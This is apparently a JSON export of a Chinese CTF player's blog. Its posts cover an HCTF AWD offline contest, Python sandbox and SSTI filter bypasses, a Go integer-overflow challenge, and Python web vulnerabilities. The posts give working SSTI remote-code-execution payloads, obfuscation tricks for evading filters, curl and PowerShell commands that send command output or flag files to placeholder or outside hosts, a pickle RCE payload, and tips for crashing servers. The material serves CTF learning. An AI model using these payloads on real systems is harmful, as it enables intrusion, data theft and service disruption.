{"meta":{"title":"evoA's Blog","subtitle":"Ctfer","description":"CTF WEB狗","author":"evoA","url":"http://evoa.me"},"pages":[],"posts":[{"title":"HCTF线下赛AWD","slug":"HCTF线下赛AWD","date":"2018-12-21T06:35:23.000Z","updated":"2018-12-24T09:03:44.186Z","comments":true,"path":"2018/12/21/HCTF线下赛AWD/","link":"","permalink":"http://evoa.me/2018/12/21/HCTF线下赛AWD/","excerpt":"","text":"HCTF线下赛AWD前言第一次参加AWD，有幸被师傅带进了线下赛Orz，运气特别好拿了个第四名 虽然事前准备了很多吧，但是真正参加的时候还是有很多手忙脚乱的地方，网上的AWD总结一看一大堆，几乎都是换汤不换药的上waf，文件守护，备份，D盾。少见的可能会放一下搅屎的思路，但其实对这次AWD来说，仅仅知道这些套路用处不是特别大，一些随机应变能力，选手的知识积累和经验，才是这场AWD真正需要的，所以这篇文章就不讲AWD的规则和常见套路，只讲这次碰到的坑和比较少关注的Trick 赛前毕竟是有赞助的比赛，机票能报销一部分特别舒服，赶着没课还顺便看了一趟女票，比赛现场很多很多零食饮料，但大家都在拿肥宅快乐水和士力架和薯片，下次AWD记得先抢这些XD 这次比赛环境需要通过有线连接，Mac需要自带转接头，另一个队的师傅到下午才借到转接头，血亏 比赛也提供的外网，但是需要连入现场的Wifi，所以就会存在有线和无线并存的情况，一开始我不知道怎么办，每次需要外网的时候就去扯网线连Wifi，但一扯的时候脚本和SSH就全崩了，后面潘师傅告诉我可以用静态路由让电脑同时连内网公网，orz 比赛有个平台，上面是显示有每一轮还有多久结束，已经当前各个队伍服务是否正常，如果有队伍被拿flag，旁边的通知栏会立马弹消息 比如: Redbud攻陷了天枢的Web1 –09：54：20 所以可以通过平台看到自己的服务有没有被打，比赛途中几乎是一直在看通知栏 比赛规则 Flag通过Json形式上传到指定接口，现场写脚本 1234567891011121314151617181920212223242526272829import osimport jsonimport requestsimport time#-------------------------------------token = '9ec7db71473995e65a672f8878a5910dd07df6c2'url = 'http://192.168.200.150:8005/api/team/submit/' + tokendictory = './flag/'sleep_time = 120 #秒#-------------------------------------files = os.listdir(dictory) #列表形式def submit(): for file in files: with open(dictory+file) as flag_txt: flags = flag_txt.readlines() for flag in flags: flag = flag.strip() dic = &#123;'flag':flag&#125; json_flag = json.dumps(dic) print(json_flag) try: res = requests.post(url,data=json_flag,headers=&#123;'Content-Type':'application/json'&#125;,timeout=1) print(res.text) except: print('连接失败') continuewhile True: submit() time.sleep(sleep_time) 其实一开始脚本没这么复杂的，至于为什么这么复杂，接下去会说 比赛前半小时的时候，主办方给了一张纸条，上面会有每个队伍的SSH账号密码，一般一个服务对应一个SSH，第一天Web只有一个服务，所以我只有一个SSH，但是比赛没开始的时候是没网的，所以是连不上去的，比赛开始的时候才能连（我刚开始一直以为是我Mac的原因） 赛时第一天由于我们队只有我一个Web，我又是第一次打线下，所以比较慌，导致一开始怎么都连不上去，后面发现我输入的IP是PWN的IP…. 这个时候就需要多年的手速，迅速连上SSH，然后赶紧文件守护，流量监控，备份 HCTF的比赛质量肯定不会给我们root，我拿到的是低权限用户，啥命令都用不了，机器是ubuntu18最新，不能提权，然后这里有个史诗级大坑，ubuntu18自带的是python3而不是python2，而且我不是root不可能apt一个python2出来，但是我的所有脚本全是py2的，但是又不可能不上流量啊，于是我花了十几分钟，一句一句把print xxxx改成了print(xxxx) 在我刚改了一会儿的时候，Nu1L已经web一血了，我差不多就知道了肯定有预留后门，但是Web只有我一个人，只能慢慢改完了脚本，上好，才开始去看D盾的扫描结果，这时候比赛已经快进行了二三十分钟了 第一个洞D盾结果发现果不其然一个预留后门，赶紧删了，随便在浏览器测了一下，发现还有几个队没有删，于是准备写一个脚本批量打，这时候第二个史诗级巨坑出现了 这次的比赛，每个队伍的Web服务都被映射到了同一个IP,每个队伍的Web服务所在IP一样但端口不一样， 例如我的Web服务是192.168.100.100:5011,另一个队就可能是192.168.100.100:5005这样的 但是我准备的攻击脚本是根据IP来区分的，端口是固定的，根本不适用这次比赛，现场重新写肯定是来不及的，Web就没人维护了，可能就直接GG了，我又害怕预留后门马上就要被删光了，肯定要趁现在多拿点flag，于是我开始手动在浏览器中打那些没删后门的队伍。。。。。 后面除了NPC后门几乎都删了，于是我赶快改了我的脚本，终于差不多可以固定ip，端口为变量了，这时候我发现我又被打了 第二个洞查看流量，发现 123192.168.100.100:5011/client/user/index.php?img=PHP://filter/convert.url-encode/resource=../../../../../../../flag和192.168.100.100:5011/client/user/index.php?img=/flag 打了很多很多很多次，怀疑，查找对应文件，最末尾发现 123if ($_GET['img']) &#123; include($_GET['img'])&#125; 文件包含，但是当我在浏览器访问这个exp时，浏览器显示无限重定向，用python的requests也拿不到flag，于是我以为这个exp是假的，但是我还是一直被打，并且流量只有这一个exp，想了许久，决定Burp抓一下包，结果一个大大flag，类似于这样 后面我才知道，requests会自动302，但是苦于当时不知道怎么阻止302，于是我又开启了手动burp拿flag的骚操作。。。 正确示范 1requests.get(url,allow_redirects=False) 小擦曲我用的是柠檬师傅的流量监控，但是里面自带了通防waf，比赛规则上写了禁止使用通防，但是我是不知情的，于是第一次，杭电的师傅下来警告我上了waf，然后我感觉把waf中的对url传参的过滤黑名单全删了，结果柠檬师傅在另一处还留了一个文件上传的通防，然后杭电师傅第二次下来。。。。。扣了800分，瞬间垫底 第三个洞一个没啥过滤的文件上传，就不细说了，然后我写的攻击脚本只是针对URL传参的攻击，上传文件的话还必须要二次访问才能利用，不死马的话需要三次访问才能利用，所以脚本比较垃圾，这次回来以后需要在改进一下 第四个洞及以后因为第二个洞的原因，我第一天一直在手动打手动交flag。。所以几乎没有时间审计，exp全靠流量，抓到直接打回去就是了，如果有flag就赶紧修然后写脚本继续打，所以漏洞的原理成因我都没去看，反正能打就行了，但是第一天还是一直垫底。 晚上img文件包含的洞打了一天，CNSS到第一天结束都没有修 回去以后找到了如何防止302的方法，然后因为我的脚本不是攻击拿到flag直接提交，而是拿到flag写入文件，所以我写了另一个脚本去访问这些文件再提交，但是我发现一个脚本要对应一个flag文件，所以我的flag提交脚本是遍历一个文件夹下的所有文件，获取每一行的内容自动提交。 但是这样有很多缺点，因为每次脚本写入的时候肯定不是以追加的方式，于是重新写入的时候，文件会清空，于是会出现提交flag脚本访问flag文件，flag文件刚好被清空的情况，为了解决这个问题，必须增大访问频率于是一开始我将提交flag脚本设置了while True: submit() 然后立马被杭电师傅请喝茶了。。。 后面提交flag的接口还把我这个IPban了。。。。。。。。。。 没办法只好改成了120s 运行一次 晚上把第一天的所有洞都改成了自动化打自动化提交，本来想着完美，结果第二天全修了，但是还是得打，因为可能会有队伍恢复备份，如果是最开始的备份，可以卡这段时间打，第二天就有很多队伍恢复备份的那小段时间被疯狂打，所以恢复备份的话还是要先修完洞在上线 第二天第一天下午PWN就有一血了，但是真正PWN开始是主力的时候应该还是第二天，Web1 第二天除了天枢都全down了，这个时候我们才发现这次比赛审洞打全场并不是最好的拿分手段，其实不被down才能最快拿分，因为比赛规则为，如果一轮某支队伍服务DOWN，则其他队伍打这支队伍不会获得任何分数，这支队伍被打也不会扣任何分，DOWN机分为60分/每轮，由没down的队伍平分，一个flag为10分，也就是说如果你服务down了，每轮必须打6支没有down的队伍才能持平，而且这次比赛的check机制十分十分十分十分十分严厉，web1几乎全场都是down的，chmd5恢复最原始的备份一开始也被check了，可以说这次的check真的是全方面不留死角的check，于是第二天我的目的就从攻击转变为了防守，第二天放出来web2，宁愿被打也要死保服务，最后web2全场只有4支队伍没有down，我靠着服务正常，每轮拿其他8支队伍的60*8/4 check扣的分，一个上午从最后一名直升第六。 web1因为全场都是down的（除了天枢）所以打web1是不拿分的，于是第二天几乎全是围绕web2，被6支队伍打扣得分才和down机分相同，所以宁愿被打也不能选择down，check的严厉程度也不能直接删文件，删功能，例如web1的第二个洞include($_GET[‘img’]) 其实是一个正常功能，直接注释就会被check，需要自己对这个功能写过滤，以及杭电200个印度人的check，还会手动登入你的ssh查看你的文件和流量脚本，真的是很严格了很辛苦了 最后靠着别人的exp以及死保的服务，还有另外两个pwn爷爷，最终拿到了第四名 后记在最后的时候好像又有很多队审出了洞，但比分已定而且我已经没什么欲望继续打下去，最终整场比赛全靠着捡洞，流量真是个好东西","categories":[],"tags":[]},{"title":"Python沙盒及SSTI 绕过","slug":"2018-11-20-Python沙盒及SSTI绕过","date":"2018-11-20T11:57:10.000Z","updated":"2018-11-22T09:21:24.672Z","comments":true,"path":"2018/11/20/2018-11-20-Python沙盒及SSTI绕过/","link":"","permalink":"http://evoa.me/2018/11/20/2018-11-20-Python沙盒及SSTI绕过/","excerpt":"","text":"护网杯ltshop引发的思考前言最近比赛打的太菜了，没什么好写的，而且先知和安全客的师傅写的太全了 贴一下前几天例会分享的沙盒及SSTI绕过 也是很基础的内容，DL 轻喷 orz SSTI形式贴出我自己SSTI中常用的py2 EXP,下面就用这个做比喻，可能还有更精简的exp，知道的师傅勿喷，求评论告知 1().__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').system('whoami')\") 面对现在CTF的出题人，想直接用这种exp 99.99%是不可能的，更何况拿shell简单的话会有一堆搅屎棍，所以出题人会用各种奇形怪状的过滤姿势阻止你直接使用，这时候就需要用一些奇技淫巧绕过这些恶心的过滤 姿势1123456import reuser_input_for_web = input() #伪代码if re.findall(r'(import)|(system)|(eval)|(builtins)|(os)',user_input_for_web) != []: exit 这种黑名单过滤了一些关键字，但是根据上面的exp，可以发现这些关键字都是在字符串中，所以我们可以使用编码字符串来绕过，例如 电脑和你很轻松就能分辨这串是恶意代码 1__import__('os').system('whoami') 那如果是这个呢 1'5f5f696d706f72745f5f28276f7327292e73797374656d282777686f616d692729' 于是我们可以使用 1eval('5f5f696d706f72745f5f28276f7327292e73797374656d282777686f616d692729'.decode('hex')) 来绕过黑名单过滤，我称之为字符串混淆 于是可以发现，只要是在字符串中的，都可以使用这种方式进行绕过 除了这个之外，还有很多字符串混淆的方式 12345678910111213141516'12345' == '123''45''12345' == ''.join(('1','2','3','4','5'))'12345' == ''.join((chr(49),chr(50),chr(51),chr(52),chr(53)))'12345' == 'MTIzNDU='.decode('base64')'12345' == b'\\x31\\x32\\x33\\x34\\x35'.decode('utf8')'12345' == '54321'[::-1] 欢迎师傅们补充 姿势2123456import reuser_input_for_web = input() #伪代码if re.findall(r'(__class__)|(__init__)|(__globals__)|(__base__)',user_input_for_web) != []: exit 还是拿我的exp举例，可以很清楚的发现，这次waf把我们的非字符串部分给过滤了，于是乎我们的姿势1完全失效 1().__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').system('whoami')\") 这时要祭出一个函数getattr() 众所周知，python面向对象做的非常完善，万物皆对象，而访问对象内的属性和方法，一般都是使用 . 来访问， 而getattr函数就是一种替代 . 来访问对象内属性和方法的函数，并且它在内置函数中，不需要引入任何包，由于他的第二个参数（被访问的属性名或方法名）为字符串形式，相当于().__class__变成了getattr((),’__class__‘)形式 惊喜发现，我们可以成功的方法属性转换成字符串形式，结合姿势1 1234().__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').system('whoami')\")getattr(getattr(getattr(getattr(getattr((),'__class__'),'__base__'),'__subclasses__')()[59],'__init__'),'__globals__')['__builtins__']['eval'](\"__import__('os').system('whoami')\") 里面的字符串随意替换混淆，别说waf了，人都看不出来这是啥 姿势3123456import reuser_input_for_web = input() #伪代码if re.findall(r'(\\[)|(\\])',user_input_for_web) != []: exit 上面的不管是哪个exp，我们都用到了[] 但如果waf过滤[]怎么办 比如a = [0,1,2,3,4,5] 如何不用[]取a的第3个元素? 方法1：a[2]== a.pop(2) pop函数会将一个列表中的一个元素弹出并返回，但是不建议使用，因为如函数描述，只能用一次，用第二次元素就已经不存在或者变成另一个元素了。 方法2：a[2]== a.__getitem__(2) 还是内置的函数方法，知道了就行了，推荐使用，记得可以跟姿势1,2结合 姿势4:如果，如果，连引号都被过滤了怎么办 123456import reuser_input_for_web = input() #伪代码if re.findall(r'(\\')|(\\'])|(\")',user_input_for_web) != []: exit 天无绝人之路 其实姿势1里面有个方式已经提示了 1'12345' == chr(49)+chr(50)+chr(51)+chr(52)+chr(53) 捕获一只没有引号的字符串 #其实我之前还想到了一个方法，不过忘了记下来，等以后想到了在放上来，求师傅们告知 姿势5：如果，都被过滤了呢？ 123456import reuser_input_for_web = input() #伪代码if re.findall(r'(&#123;&#123;)|(&#125;&#125;)',user_input_for_web) != []: exit 也就是没有回显而已嘛，可以用盲注的思想带外或反弹shell 1234&#123;% if ().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__['__builtins__']['eval'](\"__import__('os').system('curl http://127.0.0.1:1234?`cat flag`')\") %&#125;1&#123;% endif %&#125; 然后在放一下带外的exp(markdown有时自动把引号转成中文的，师傅们记得注意符号避免踩坑) 1234#linux下的pocos.system('$a=`ifconfig` || curl –data \"$a\" http://xxx.xxx.xxx.xxx:xxxx')os.system(curl https://xxx.xxx.xxx.xxx/? `cat flag.txt`) 123#windows下的pocos.system('powershell $a=ipconfig; curl http://xxx.xxx.xxx.xxx:xxxx -Body $a -Method post') 杂最后放一些再别的地方可能用得到的沙盒绕过tip execfile()加载执行一个Py文件，并把里面的方法全部加载到当前上下文中 1execfile('./os.py') == from os.py import * reload()Python中能直接引用的函数都是__builtin__中 123del __builtins__.__import__reload(__builtins__) dir()获得当前模块下的属性方法等 list()元祖变列表","categories":[{"name":"CTF","slug":"CTF","permalink":"http://evoa.me/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://evoa.me/tags/Web/"},{"name":"CTF","slug":"CTF","permalink":"http://evoa.me/tags/CTF/"}]},{"title":"护网杯ltshop引发的思考","slug":"2018-10-14-护网杯ltshop引发的思考","date":"2018-10-14T05:21:14.000Z","updated":"2018-10-14T20:12:07.693Z","comments":true,"path":"2018/10/14/2018-10-14-护网杯ltshop引发的思考/","link":"","permalink":"http://evoa.me/2018/10/14/2018-10-14-护网杯ltshop引发的思考/","excerpt":"","text":"护网杯ltshop引发的思考前言质量还是比较高的一个比赛，Web有点偏，不过对大家来说很公平，除了一些神仙队，如此题开局6小时无一人做出，一血后一个多小时就60多个队了，神仙神仙，打不过。本来有机会进线下的，奈何1000分的理论题忘了做了。。。。小伤 题目描述题目开始需要注册账号，登陆进去后是一个商场，每个账号初始有20RMB，5RMB可以买1包大辣条，5包大辣条换1包辣条之王，9999999包辣条之王可以换Flag 做题思路全页面就一个输入点，选择你需要越换辣条之王的数量，发现我们的钱连一个辣条之王都买不了，联想到之前CTFtime上的某个比赛（忘了），第一步条件竞争，Burp200线程买大辣条，成功买到16包大辣条！！！，但是因为要9999999包辣条之王才能换flag 思路1:查看此题有没有换回去的方法，如果存在可以通过条件竞争一直来回换辣条和RMB，导致RMB或辣条越来越多从而买到Flag，遗憾的是并没有反向兑换 思路2:查看是否可以通过注册账号功能或者其他功能，让每个账号的资产全部移植到同一个账号上去。Burp抓全部包，一一查看，发现逻辑全部在后台处理，除了cookie没有任何输入点，放弃 思路3:可以通过php弱类型类似于0.999999=1的方法，发现小数点被过滤，放弃 然后我就被卡在这了，常规思路走不通，走不常规思路，首先Fuzz输入框，发现除了数字几乎全部被过滤，但是；(分号)并没有被过滤，但也没有利用的方法，扫目录扫文件泄露没有任何发现，cookie发现后台是用golang写的，百度一波golang的漏洞，看了一波文章没有任何发现。。。 然后后面几乎一直都在人肉Fuzz了，啥字符啥payload都输了一遍，没有任何反应，然后突然刘师傅说了一句会不会是数值溢出因为go是强类型。发现新大陆，查看go数据类型最大值准备fuzz poc。 但打到比赛结束都没有做出来，赛后看wp发现要除以5才能拿，之前Web没做过溢出的题目，研究了一会儿，大概推测后台代码大致如下(不会Go用伪代码代替一下) 1234567891011121314151617181920#伪代码uint64 number = input() //用户输入的兑换辣条之王的数字uint64 max = math.uint64max //无符号整型的最大值uint64 biglt = 16 //用户的大辣条包数，如上假如为16包uint64 kinglt = 0 //用户拥有的辣条之王if(number不是数字)&#123; error&#125;else if(number &gt; max)&#123; error&#125;else if( (biglt - 5 * number) &lt; 0 )&#123; print 买不起那么多&#125;else if( (biglt - 5 * number) &gt;= 0 )&#123; print 购买成功 biglt = biglt - 5 * number kinglt = number&#125; Go的64位无符号整型最大值为18446744073709551615（简称max） 对于无符号整型的溢出，我们知道 max + 1 = 0 max + 2 = 1 max + n = n -1 max * 2 = max - 1 max * 3 = max - 2 max * n = max - n 此时我们需要绕过判断让我们购买超多的辣条之王，所以上诉代码 biglt - 5 * number必须大于0 此时5 * number必须小于16 如上公示得知直接输入max是行不通的（比赛时候疯狂输入max,max-1,max+1……)，我们需要变换一下思路，比如(max + 1) / 5, (max + 2) / 5, (max + 3) / 5…… 只要max+n是5的倍数就行，我们选用(max+5) / 5, 此时biglt - 5 * number,等价于16 - max+5 等价于 16 - 4 等价于12，绕过了之前的所有判断，kinglt被赋值为(max+5)/5,大于9999999，我们成功买到了flag 后记没做出来有点可惜，本来其实可以想到的，但由于最后做出来的人太多了:) 可能有点慌一直在Fuzz了，没有想到去猜后台代码。归根结底还是自己太菜了，膜师傅们","categories":[{"name":"CTF","slug":"CTF","permalink":"http://evoa.me/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://evoa.me/tags/Web/"},{"name":"CTF","slug":"CTF","permalink":"http://evoa.me/tags/CTF/"}]},{"title":"Python web安全(持续更新)","slug":"2018-10-03-Python-web安全(持续更新)-post","date":"2018-10-02T16:00:00.000Z","updated":"2018-10-14T17:14:51.074Z","comments":true,"path":"2018/10/03/2018-10-03-Python-web安全(持续更新)-post/","link":"","permalink":"http://evoa.me/2018/10/03/2018-10-03-Python-web安全(持续更新)-post/","excerpt":"","text":"SSTI in jinja2注入发生的原因：​ 由于不规范的代码习惯，参数格式化进字符串中在渲染模板，导致数据与逻辑混淆产生代码注入 解决办法​ 将数据和模板文件一同渲染 示例12345678910111213#app.pyfrom flask import Flask,render_template,request,render_template_stringapp = Flask(__name__)@app.route('/&lt;name&gt;')def security(name): page = '''&lt;h1&gt;This is Test page&lt;/h1&gt; &lt;h2&gt;Input: &#123;&#125;&lt;/h2&gt;'''.format(name) return render_template_string(page)if __name__ == '__main__': app.run(debug=True,host='0.0.0.0') 利用读取敏感信息我们必须通过一些全局变量来读取我们所需要的配置文件，flask内部存在request，config等全局变量 request request.environ 请求上下文信息 request.environ[‘werkzeug.server.shutdown’]() 关闭运行服务器 config 所有的配置值 数据库连接字符串，第三方服务凭据，SECRET_KEY等 config.items() 查看配置 config.root_path 查看文件所在的绝对路径 config.from_object config.from_pyfile config.from_envvar 对于reuqest全局变量，代表的是我们当前的请求及其上下文(服务器环境)，request对象中存在一个environ字典对象，里面包含了请求的上下文信息，该字典当中有一个shutdown_server的方法，相应的key值werkzeug.server.shutdown，执行此方法可以杀死服务器进程，虽然比较鸡肋，但线下赛可能有用 而对于config对象，其中储存了flask服务端的所有配置值, 除了配置值外，config中还存在几个方法，我们重点先谈config.from_object方法，下面贴出源码 1234567891011121314151617181920212223242526272829303132#!python def from_object(self, obj): \"\"\"Updates the values from the given object. An object can be of one of the following two types: - a string: in this case the object with that name will be imported - an actual object reference: that object is used directly Objects are usually either modules or classes. Just the uppercase variables in that object are stored in the config. Example usage:: app.config.from_object('yourapplication.default_config') from yourapplication import default_config app.config.from_object(default_config) You should not use this function to load the actual configuration but rather configuration defaults. The actual config should be loaded with :meth:`from_pyfile` and ideally from a location not within the package because the package might be installed system wide. :param obj: an import name or object \"\"\" if isinstance(obj, string_types): obj = import_string(obj) for key in dir(obj): if key.isupper(): self[key] = getattr(obj, key) def __repr__(self): return '&lt;%s %s&gt;' % (self.__class__.__name__, dict.__repr__(self)) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!pythondef import_string(import_name, silent=False): \"\"\"Imports an object based on a string. This is useful if you want to use import paths as endpoints or something similar. An import path can be specified either in dotted notation (``xml.sax.saxutils.escape``) or with a colon as object delimiter (``xml.sax.saxutils:escape``). If `silent` is True the return value will be `None` if the import fails. :param import_name: the dotted name for the object to import. :param silent: if set to `True` import errors are ignored and `None` is returned instead. :return: imported object \"\"\" # force the import name to automatically convert to strings # __import__ is not able to handle unicode strings in the fromlist # if the module is a package import_name = str(import_name).replace(':', '.') try: try: __import__(import_name) except ImportError: if '.' not in import_name: raise else: return sys.modules[import_name] module_name, obj_name = import_name.rsplit('.', 1) try: module = __import__(module_name, None, None, [obj_name]) except ImportError: # support importing modules not yet set up by the parent module # (or package for that matter) module = import_string(module_name) try: return getattr(module, obj_name) except AttributeError as e: raise ImportError(e) except ImportError as e: if not silent: reraise( ImportStringError, ImportStringError(import_name, e), sys.exc_info()[2]) 代码的大概意思是，当config.from_object传入一个字符串时，python会载入这个字符串对应的模块将所有大写的属性全部加入当前应用实例中。 SSTI in Jinja2执行任意代码当程序源码中未引入注册os等敏感包时，jinja无法调用os模块的相关函数，为了执行任意代码，这里联想到CTF比赛中经常出现的沙盒绕过， __bases__ 返回一个类直接所继承的类（元组形式） __class__ 返回一个实例所属的类 _globals__ 使用方式是 函数名.__globals__，返回一个当前空间下能使用的模块，方法和变量的字典。 __subclasses__() 获取一个类的子类，返回的是一个列表 __builtin__&amp;&amp; __builtins__ python中可以直接运行一些函数，例如int(),list()等等。这些函数可以在__builtins__中可以查到。查看的方法是dir(__builtins__)。在控制台中直接输入__builtins__会看到如下情况 123#python2&gt;&gt;&gt; __builtins__&lt;module &apos;__builtin__&apos; (built-in)&gt; python3 poc ().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;) python2 poc ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;) Tips : 用以上Poc执行多次reboot shutdown su等命令，可以导致服务器机器卡死（宕机），线下赛Tip 还有不知道为啥通过@app.route(‘/ssti/&lt;name>‘) 这样引入的参数不能输入/ (斜杠)否则404，困惑，用request.argv.get获得就没关系，导致我一直没办法闭合&lt;/script>标签 接下来就是自己的理解了，但是发现在jinja2中使用os.system执行没有回显 可以用os.popen().read()读取 如果有字数限制，可以使用带外注入至文件，或者模板注入下python3下open()个文件就是用不了，这个以后再管，一直报类型错误 还有一种URL的带外注入，把命令返回值付给变量然后在请求带返回值参数的url吧,命令用反引号包裹赋给变量才会付给其返回值 linux下的poc os.system(‘$a=`ifconfig` || curl –data “$a” http://xxx.xxx.xxx.xxx:xxxx&#39;) 或 os.system(curl https://crowdshield.com/?\\`cat flag.txt`) windows下的poc os.system(‘powershell $a=ipconfig; curl http://xxx.xxx.xxx.xxx:xxxx -Body $a -Method post’) 可删去http://反序列化执行任意代码Python的反序列话与php不同，Python可以反序列化任意对象（既没有加载到代码中的OS等对象），而php反序列化只能加载已经存在的对象。这导致了Python反序列化可以执行任意代码。 pickle 基础指令 c：读取新的一行作为模块名module，读取下一行作为对象名object，然后将module.object压入到堆栈中。 (：将一个标记对象插入到堆栈中。为了实现我们的目的，该指令会与t搭配使用，以产生一个元组。 t：从堆栈中弹出对象，直到一个“(”被弹出，并创建一个包含弹出对象（除了“(”）的元组对象，并且这些对象的顺序必须跟它们压入堆栈时的顺序一致。然后，该元组被压入到堆栈中。 S：读取引号中的字符串直到换行符处，然后将它压入堆栈。 R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。 .：结束pickle。 Eg: 123456789import osimport picklea = '''cossystem(S'ipconfig'tR.'''pickle.loads(a) 造成命令执行 除此之外还有PyYAML存在反序列漏洞（未了解） 格式化字符串漏洞由于python format格式化的功能，导致可以通过格式化字符串获取一些敏感数据，利用比较苛刻，且Django下可以读一些敏感数据。其他框架下十分难以利用 123456\"&#123;username&#125;\".format(username='phithon') # 普通用法\"&#123;username!r&#125;\".format(username='phithon') # 等同于 repr(username)\"&#123;number:0.2f&#125;\".format(number=0.5678) # 等同于 \"%0.2f\" % 0.5678，保留两位小数\"int: &#123;0:d&#125;; hex: &#123;0:#x&#125;; oct: &#123;0:#o&#125;; bin: &#123;0:#b&#125;\".format(42) # 转换进制\"&#123;user.username&#125;\".format(user=request.username) # 获取对象属性\"&#123;arr[2]&#125;\".format(arr=[0,1,2,3,4]) # 获取数组键值 Eg： 12345678910111213141516171819#用户实例类class admin(): name = 'admin' password = 'cmhwyx'class test(): name = 'test' password = 'test123'#用户类 class users(): name = 'users' user1 = admin() user2 = test()@app.route('/')def string(): user = admin() name1 = '&lt;h1&gt;&#123;user.user2.name&#125;&lt;/h1&gt;'+request.args.get('poc') #此处传入了一个参数 return Response(name1.format(user=users)) #格式化一个字符串 此时如果我们输入 http://domain.org/?poc={user.user1.password}即可以读到admin的密码 并且还可以通过python继承链找到一些更敏感的数据，暂时还找不到造成RCE，但Django框架可以通过继承链读取一些敏感数据 》参考P神的 Python 格式化字符串漏洞（Django为例） SQL注入通过框架自带的是不会造成sql注入的,如下： Person.objects.filter(first_name=request.GET.get(&#39;user&#39;)) 等 但如果使用原生Sql语句依旧可以造成注入 Person.objects.raw(&#39;select * from users &#39;) 或 123456import sqlite3conn = sqlite3.connect('test.db')curs = conn.cursor()curs.execute('SELECT `id`,`username`,`password` FROM `users`' where id = 变量) Python命令执行函数123456789101112131415161718192021eval, execfile, compile, open, file, map, input,os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe,os.listdir, os.access,os.execl, os.execle, os.execlp, os.execlpe, os.execv,os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,pickle.load, pickle.loads,cPickle.load,cPickle.loads,subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,commands.getstatusoutput,commands.getoutput,commands.getstatus,glob.glob,linecache.getline,shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,dircache.listdir,dircache.opendir,io.open,popen2.popen2,popen2.popen3,popen2.popen4,timeit.timeit,timeit.repeat,sys.call_tracing,code.interact,code.compile_command,codeop.compile_command,pty.spawn,posixfile.open,posixfile.fileopen,platform.popen Python沙箱逃逸的n种姿势 用python继承链搞事情 利用Python pickle实现任意代码执行 Python 格式化字符串漏洞（Django为例） Python反序列化漏洞的花式利用","categories":[{"name":"web安全","slug":"web安全","permalink":"http://evoa.me/categories/web安全/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://evoa.me/tags/Web/"},{"name":"python","slug":"python","permalink":"http://evoa.me/tags/python/"}]}]}